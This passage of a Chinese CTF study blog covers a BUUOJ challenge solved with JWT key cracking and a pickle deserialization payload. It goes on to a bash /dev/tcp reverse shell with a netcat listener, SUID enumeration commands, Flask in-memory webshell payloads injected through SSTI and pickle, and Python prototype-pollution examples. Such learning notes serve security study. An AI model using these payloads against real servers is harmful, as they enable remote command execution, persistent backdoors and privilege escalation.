<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    r=requests.get( url + <span class="built_in">str</span>(i) )</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>发现之后抓包改折扣，购买完之后发现只允许admin访问，然后看到使用了JWT</p>
<p>爆破key，发现密码是 <code>1Kun</code></p>
<p>username改成admin后构造再访问，然后给了代码审计，发现用了pickle.loads()，直接打pickle反序列化即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1K274zmEur/?spm_id_from=333.1387.homepage.video_card.click">https://www.bilibili.com/video/BV1K274zmEur/?spm_id_from=333.1387.homepage.video_card.click</a></p>
<p><img src="/img/lazy.gif" data-original="sh1.png" alt=""></p>
<p><img src="/img/lazy.gif" data-original="sh2.png" alt=""></p>
<p><img src="/img/lazy.gif" data-original="sh3.png" alt=""></p>
<p><img src="/img/lazy.gif" data-original="sh4.png" alt=""></p>
<p><code>nc -lvp 9999</code></p>
<p>nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-v 详细输出--用两个-v可得到更详细的内容</span><br><span class="line">-p port 本地端口号</span><br></pre></td></tr></table></figure>
<p><code>bash -i &gt;&amp; /dev/tcp/192.168.239.128/9999 0&gt;&amp;1</code></p>
<p>bash -i代表在本地打开一个bash</p>
<blockquote>
<p>&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps<br>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接<br>远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</p>
<p>————————————————</p>
</blockquote>
<ul>
<li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li>
<li>在/dev/tcp/ip/port后面加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了<br>那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程</li>
</ul>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>什么是SUID？</p>
<p>Linux下文件权限分为 r4 w2 x1分别对应可读，可写，可执行</p>
<ul>
<li>当 SUID 位被设置在一个可执行文件上时，该文件在执行期间，进程的有效用户 ID（EUID）会被设置为该文件所有者的用户 ID。例如，一个属于 root 用户的文件，如果设置了 SUID 位，当普通用户执行这个文件时，这个执行进程的 EUID 就是 root</li>
<li>有效用户 ID 决定了进程在执行过程中对系统资源访问的权限。这就意味着，如果一个程序需要更高权限（通常是 root 权限）才能完成某些特定的操作，通过设置 SUID 位，普通用户在运行这个程序时也能临时获得该程序所有者的权限来执行这些操作</li>
</ul>
<p>root权限一般是3位，就比如说是什么644（所属者-所属组-other）</p>
<p>而sudo的权限可以是4位比如7644</p>
<p>然后就是SUID文件只作用于二进制文件</p>
<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fxsec/p/15000570.html">深入浅出内存马（一） - 风炫安全 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究 - gxngxngxn - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://longlone.top/安全/安全研究/flask不出网回显方式/">flask不出网回显方式 - Longlone’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13858">Python Flask内存马的另辟途径-先知社区</a></p>
<h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p><strong>内存马，即无文件型WebShell</strong>，常规Webshell比如一句话木马，都是通过将文件传入靶机里，然后可以通过蚁剑等webshell工具来连接，从而可以访问内部的文件，但是直接传个文件未免有点过于明目张胆了，很容易被查杀，所以这就有了一个新的上传WebShell的方式：内存马，通过在网站中注册一个新的路由，通过新的路由来进行攻击</p>
<h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>（Java也没学，那我先放着）</p>
<h3 id="Flask下应用"><a href="#Flask下应用" class="headerlink" title="Flask下应用"></a>Flask下应用</h3><h4 id="Debug模式下利用报错"><a href="#Debug模式下利用报错" class="headerlink" title="Debug模式下利用报错"></a>Debug模式下利用报错</h4><p>Flask如果开启<code>debug=True</code>模式的话，如果报错了就会显示详细信息，如果题目在eval之后没有回显，可以利用手动控制报错的方式来让命令回显到报错页面上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="非Debug模式下利用"><a href="#非Debug模式下利用" class="headerlink" title="非Debug模式下利用"></a>非Debug模式下利用</h4><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度</p>
<p>老方法是，利用<code>add_url_rule</code>来创建后门路由</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].add_url_rule(<span class="string">&#x27;/shell&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="keyword">lambda</span> :os.popen(<span class="string">&#x27;dir&#x27;</span>).read())</span><br></pre></td></tr></table></figure>
<p>但是在新版本Flask中，通过<code>add_url_rule</code>来创建路由的方法已经不再适用，取而代之的是<code>before_request</code>和<code>after_request</code></p>
<p>先来看<code>before_request</code>，通过跟进<code>app.before_request</code>可以发现，<code>before_request</code>调用了<code>self.before_request_funcs.setdefault(None, []).append(f)</code></p>
<p><img src="/img/lazy.gif" data-original="ma1.png" alt=""></p>
<p>可以发现，f是可以自定义的，所以如果我们给f传入一个匿名函数，是不是就可以调用了呢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span>:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>这样每次发起请求前，就可以触发这个匿名函数了，结合老版本的payload，可以写出新版的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_requests_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>好了，现在知道了<code>before_request</code>的使用方法，再来看<code>after_request</code>就很简单了，同样是跟进，能发现：</p>
<p><img src="/img/lazy.gif" data-original="ma2.png" alt=""></p>
<p>从这里的<code>The function is called with the response object, and must return a response object</code>可以知道，这里的 f 需要接收一个response对象，同时返回一个response对象</p>
<p>但我们仅通过lambad无法对原始传进来的response进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response，对应payload可以为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global CmdResp;CmdResp=make_response(os.popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure>
<p>如果没有导入包的情况，就用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这点在下面的无回显SSTI中有所体现</p>
<p>接下来是<code>errorhandler</code>，<code>errorhandler</code>在当Http的404页面不存在的时候被调用，结合直接在Debug模式下通过控制404页面获得回显的方法，是不是嗅到了一丝内存马的味道，以下是基本利用方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;404&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;404 Not Found&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="ma3.png" alt=""></p>
<p>还是老样子，跟进试试</p>
<p><img src="/img/lazy.gif" data-original="ma4.png" alt=""></p>
<p><img src="/img/lazy.gif" data-original="ma5.png" alt=""></p>
<p><img src="/img/lazy.gif" data-original="ma6.png" alt=""></p>
<p>可以看到，<code>exc_class</code>和<code>code</code>这两个变量，通过分析代码可知，<code>code</code>就是404，<code>exc_class</code>是一个对象，<code>f</code>就是返回值，然后又可以看到<code>exc_class</code>和<code>code</code>是通过<code>_get_exc_class_and_code</code>来获取的，而<code>exc_class</code>直接从异常中取得，不太好构造，那就可以尝试构造<code>code</code>和<code>f</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>访问不存在的路径触发即可</p>
<p>附带Pickle代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
<h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h3><h4 id="训练-西电-CTF-终端-第二十二章-血海核心·千年手段"><a href="#训练-西电-CTF-终端-第二十二章-血海核心·千年手段" class="headerlink" title="训练 - 西电 CTF 终端 第二十二章 血海核心·千年手段"></a><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/22?challenge=943">训练 - 西电 CTF 终端</a> <strong>第二十二章 血海核心·千年手段</strong></h4><p><img src="/img/lazy.gif" data-original="mo12.png" alt=""></p>
<p>他执行完之后这个返回值没有用到</p>
<p><img src="/img/lazy.gif" data-original="mo13.png" alt=""></p>
<p>最终返回的是这个login_msg</p>
<p><img src="/img/lazy.gif" data-original="mo14.png" alt=""></p>
<p>login_msg的内容是这个，所以是原样输出了，可以理解成这里是个盲ssti，没有回显的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80552914/article/details/144565609?sharetype=blog&amp;shareId=144565609&amp;sharerefer=APP">https://blog.csdn.net/2301_80552914/article/details/144565609?sharetype=blog&amp;shareId=144565609&amp;sharerefer=APP</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;&amp;password=<span class="number">1</span>&amp;cmd=ls /</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="mo15.png" alt=""></p>
<p>后面就是提权问题了，可以看到/bin下有一个rev.c文件</p>
<p>查看后可以发现只需要</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/rev --HDdss /flag</span><br></pre></td></tr></table></figure>
<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12518">xz.aliyun.com/news/12518</a></p>
<p><a target="_blank" rel="noopener" href="https://rycarl.cn/index.php/2025/04/28/python原型链污染从基础到深入/">Python原型链污染从基础到深入 - Rycarls little blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体(prototype-pollution-in-python) - Article_kelp - 博客园</a></p>
<h4 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h4><p>Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法</p>
<ul>
<li><strong>原型继承特性</strong><br>Python中每个对象通过<code>__class__</code>属性指向其所属类，类通过<code>__base__</code>属性指向父类。当访问对象属性时，若当前对象/类中未定义，会沿原型链向上查找</li>
<li><strong>污染条件</strong><br>需要存在递归合并函数（如<code>merge</code>）且未对特殊属性过滤</li>
</ul>
<p>来看一段代码：(很典型的原型链污染标志)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
<p>然后对src中的键值对进行了遍历，然后检查dst中是否含有<code>__getitem__</code>属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值</p>
<p>如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历</p>
<hr>
<p><code>__getitem__</code> 是一个特殊的方法。它是对象的索引操作符重载方法，主要用于定义当使用方括号 <code>[]</code> 对象访问元素时的行为。当你尝试访问像 <code>object[key]</code> 这样的元素时，Python 会调用 <code>__getitem__</code> 方法（索引如<code>my_list[0]</code>）</p>
<hr>
<h5 id="污染分析（经典例子）"><a href="#污染分析（经典例子）" class="headerlink" title="污染分析（经典例子）"></a>污染分析（经典例子）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure>
<p>我们打断点看看</p>
<p><img src="/img/lazy.gif" data-original="w7.png" alt=""></p>
<p>第一步的时候，由于dst中没有<code>__getitem__</code>属性，所以跳到elif进行</p>
<p>此时k变成<code>__class__</code>，v变成<code>&#123;&#39;__base__&#39;:&#123;&#39;secret&#39;:&#39;world&#39;&#125;&#125;</code></p>
<p><img src="/img/lazy.gif" data-original="w8.png" alt=""> </p>
<p>然后从递归进入第二次循环，这次提取dst中的<code>__base__</code>给k，那么v就等于<code>&#123;&#39;secret&#39;:&#39;world&#39;&#125;</code></p>
<p><img src="/img/lazy.gif" data-original="w9.png" alt=""></p>
<p>由于dst中没有<code>__getitem__</code>属性，所以跳到elif进行，递归进入第三次循环</p>
<p>此时k就应该等于secret，v等于secret</p>
<p><img src="/img/lazy.gif" data-original="w10.png" alt=""></p>
<p>由于dst中没有<code>__getitem__</code>属性，所以跳到elif进行，但是这次的v也不再是个字典，所以跳到else中进行setattr的操作，这是成功将k,v赋值给father类中的键值对，成功污染</p>
<p>（实际上就是一层层向上爬）</p>
<p><img src="/img/lazy.gif" data-original="w11.png" alt=""></p>
<p>当然，也有不能污染的，比如<strong>Object</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span> : <span class="string">&quot;Polluted ~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment">#TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><h6 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h6><p><strong>原理</strong></p>
<p><code>__init__</code>作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间</p>
<p>可以用这一段来看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> :</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(demo.__globals__==<span class="built_in">globals</span>()==A.__init__.__globals__)</span><br></pre></td></tr></table></figure>
<p>接下面的例子</p>
